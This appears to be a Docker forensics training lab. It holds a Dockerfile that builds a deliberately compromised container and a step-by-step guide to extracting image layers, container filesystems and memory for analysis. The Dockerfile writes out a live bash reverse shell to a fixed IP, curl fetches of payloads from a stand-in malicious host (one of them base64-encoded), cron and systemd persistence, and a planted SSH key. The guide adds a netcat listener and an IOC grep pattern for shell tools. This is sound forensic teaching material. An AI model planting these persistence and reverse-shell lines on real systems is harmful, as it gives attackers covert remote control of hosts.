@@ -1,0 +1,254 @@
+complete-docker-forensics-step-by-step
+
+-----------------------------------------------------------------------------------------------------------------------
+docker-file
+
+FROM ubuntu:20.04
+
+RUN apt-get update && \
+    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat curl vim wget python3 cron systemctl openssh-server && \
+    useradd attacker && echo 'attacker:attacker123' | chpasswd && \
+    mkdir -p /home/attacker && chown attacker:attacker /home/attacker
+
+# Create fake malware script
+RUN echo '#!/bin/bash' > /home/attacker/malware.sh && \
+    echo 'echo "Stealing data..."' >> /home/attacker/malware.sh && \
+    echo 'curl http://malicious.example.com/payload.sh' >> /home/attacker/malware.sh && \
+    chmod +x /home/attacker/malware.sh
+
+# Create reverse shell script (edit IP)
+RUN echo '#!/bin/bash' > /home/attacker/revshell.sh && \
+    echo 'bash -i >& /dev/tcp/192.168.44.129/4444 0>&1' >> /home/attacker/revshell.sh && \
+    chmod +x /home/attacker/revshell.sh
+
+# Simulated bash history
+RUN echo -e "whoami\nhostname\nifconfig\ncat /etc/passwd\nbase64 /etc/passwd\n./malware.sh\n./revshell.sh" > /home/attacker/.bash_history
+
+# Add cron persistence
+RUN echo "* * * * * /home/attacker/revshell.sh" >> /var/spool/cron/crontabs/attacker && \
+    chmod 600 /var/spool/cron/crontabs/attacker
+
+# Add systemd service (simulated persistence)
+RUN mkdir -p /etc/systemd/system && \
+    echo "[Unit]\nDescription=Malicious Backdoor\n[Service]\nExecStart=/home/attacker/revshell.sh\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
+
+# SSH backdoor
+RUN mkdir -p /home/attacker/.ssh && \
+    echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' > /home/attacker/.ssh/authorized_keys && \
+    chmod 600 /home/attacker/.ssh/authorized_keys && \
+    chown -R attacker:attacker /home/attacker/.ssh
+
+# Encoded payload
+RUN echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoCg==" > /home/attacker/encoded_payload.b64
+
+WORKDIR /home/attacker
+USER attacker
+
+CMD ["/home/attacker/revshell.sh"]
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+README.md
+This file provides step-by-step instructions for setting up the lab, running the container, and performing forensic analysis.
+
+🔧 Setup Instructions
+Build the Docker Image:
+sudo docker build -t attacker-lab .
+
+Run the Container:
+netcat -nlvp 4444
+sudo docker run --name attacker-lab1 -it attacker-lab
+sudo docker rm -f $(sudo docker ps -aq)   -- killing all containers
+
+--------------------------------------------------------------------------------------------------------------------------------
+basic docker commands
+
+Here’s a cheat sheet of basic Docker commands useful when starting with Docker and particularly helpful during forensic investigations:
+
+---
+
+ 🐳 Basic Docker Info & Setup
+
+| Command                  | Description                                 |
+| ------------------------ | ------------------------------------------- |
+| 'docker version'         | Show installed Docker version info          |
+| 'docker info'            | Show detailed system-wide info about Docker |
+| 'docker ps'              | List running containers                 	 |
+| 'docker ps -a'           | List all containers (running + stopped) 	 |
+| 'docker images'          | List downloaded images                      |
+| 'docker container ls'    | Same as 'docker ps'                         |
+| 'docker container ls -a' | All containers (running or not)             |
+	sudo docker container ls -a --no-trunc
+
+
+ 🔍 Inspect and Logs
+
+| Command                                    | Description                                       |
+| ------------------------------------------ | ------------------------------------------------- |
+| 'docker inspect attacker-lab'              | Show low-level info (e.g., PID, mount paths)      |
+| 'docker logs attacker-lab'                 | View stdout/stderr logs of a container            |
+| 'docker diff attacker-lab'                 | See changes to container’s filesystem since start |
+| 'docker history attacker-lab'				 | provides history information in the image 		 |
+| 'docker exec -it attacker-lab3 /bin/bash'  | Execute command inside a running container        |
+
+---
+
+ 💡 Tip for Forensics:
+
+To get the PID of a running container (useful for memory dump):
+
+docker inspect --format '{{.State.Pid}}' attacker-lab3
+-----------------------------------------------------------------------------------------------------------------------------------------------
+Start Netcat Listener on Attacker Machine:
+nc -lvnp 4444
+Wait for the reverse shell connection from the container.
+
+sudo tcpdump -i any port 4444 -w revshell.pcap
+wireshark revshell.pcap
+
+
+🕵️ Forensic Investigation Guide
+📁 Export and Inspect Images
+		exit the shell first
+		sudo docker save attacker-lab > attacker-manifest.tar 
+		sudo tar -xvf attacker-manifest.tar -C attacker-manifest/
+			
+			below is the structure of docker image
+				blobs/              ⬅️ Contains all layers and config blobs (tarballs and JSONs)
+				index.json          ⬅️ Points to manifest.json (used to find the image to run)
+				manifest.json       ⬅️ Lists the image config, layers, and tags
+				oci-layout          ⬅️ Version indicator for OCI image spec
+				repositories        ⬅️ Optional legacy info — tag to manifest mapping
+				layers 				⬅️ refer to the individual filesystem changes such as additions/modifications/deletions that make up the complete image. They are stored inside the blobs/ directory.
+
+		cat manifest.json   -- contains the information of the layers from oldest at top and newest at the bottom
+		sudo docker history attacker-lab --no-trunc       -- it provides the opposite that newest at top and oldest at bottom and we can compare that
+	
+	below is the script to extract the layers file to map with the manifest.json file
+---------------------------
+										#!/bin/bash
+
+								# Directory where the OCI image was extracted
+								OCI_DIR="/home/j0ck3r/Downloads/malware/malware-samples/docker-malicious/manifest-attacker/"
+								LAYER_DIR="layers"
+
+								mkdir -p "$LAYER_DIR"
+								cd "$OCI_DIR" || exit 1
+
+								# Read manifest.json
+								manifest_file="manifest.json"
+								layer_digests=$(jq -r '.[0].Layers[]' "$manifest_file")
+
+								layer_num=1
+
+								echo "[*] Extracting layers from manifest.json..."
+								for digest in $layer_digests; do
+									# Clean up the digest path
+									clean_digest=$(basename "$digest")
+									tarball="blobs/sha256/$clean_digest"
+									
+									if [ -f "$tarball" ]; then
+										out_dir="../$LAYER_DIR/layer$layer_num"
+										mkdir -p "$out_dir"
+										echo "  → Extracting layer $layer_num to $out_dir"
+										tar -xf "$tarball" -C "$out_dir"
+									else
+										echo "    Layer tarball not found: $tarball"
+									fi
+
+									((layer_num++))
+								done
+
+								cd ..
+
+								echo "[*] Extraction complete."
+								echo "[*] Starting basic IOC checks..."
+
+								# Basic forensic IOC sweep
+								for d in "$LAYER_DIR"/*; do
+									echo "---- Analyzing $(basename "$d") ----"
+									
+									find "$d" -type f \( -name "*cron*" -o -name "*bash_history*" -o -name "*.sh" -o -name "*.service" \) -print
+
+									# Optional: grep for reverse shells or suspicious commands
+									grep -rE "nc -e|bash -i|curl|wget|/dev/tcp" "$d" 2>/dev/null
+									echo
+								done
+
+								echo " Analysis complete. Layers in $LAYER_DIR/"
+
+-----------------------------		
+		sudo ./manifest-layers-extracted.sh
+		sudo find layers -type f -name "*.sh"
+		
+	Export and Inspect containers file-system
+Extract the Filesystem:
+	docker export attacker-lab1 > attacker-lab.tar
+	mkdir extracted_lab
+	tar -xf attacker-lab.tar -C extracted_lab
+
+Analyze Artifacts:
+	Bash History:
+		cat extracted_lab/home/attacker/.bash_history
+
+	Malware Script:
+		cat extracted_lab/home/attacker/malware.sh
+
+	Reverse Shell Script:
+		cat extracted_lab/home/attacker/revshell.sh
+
+	base64 decode
+		base64 -d extracted_lab/home/attacker/encoded_payload.b64
+
+
+	Cron Jobs:
+		cat extracted_lab/var/spool/cron/crontabs/attacker
+
+			output -- * * * * * /home/attacker/revshell.sh
+
+		*     *     *     *     *     command_to_run
+		-     -     -     -     -
+		|     |     |     |     |
+		|     |     |     |     +----- Day of the week (0 - 7) (Sunday = 0 or 7)
+		|     |     |     +------- Month (1 - 12)
+		|     |     +--------- Day of month (1 - 31)
+		|     +----------- Hour (0 - 23)
+		+------------- Minute (0 - 59)
+
+
+
+	Systemd Service:
+		cat extracted_lab/etc/systemd/system/backdoor.service
+
+
+	SSH Authorized Keys:
+		cat extracted_lab/home/attacker/.ssh/authorized_keys
+
+
+	Encoded Payload:
+		base64 -d extracted_lab/home/attacker/encoded_payload.b64
+
+🧠 Memory Analysis
+
+			📸 Capturing Memory with gcore
+			Find Container PID:
+			docker inspect --format '{{.State.Pid}}' attacker-lab
+
+
+			Dump Memory:
+			sudo gcore -o memdump <PID>
+			This will create a memdump.<PID> file.
+
+			analysing with radar2
+			sudo radare2 -q -c 'iI; iz; afl'  memdump.176738
+			176738
+
+			OR
+
+			sudo cat /proc/176738/maps > maps.txt
+
+
+
+--------------------------------------------------
+
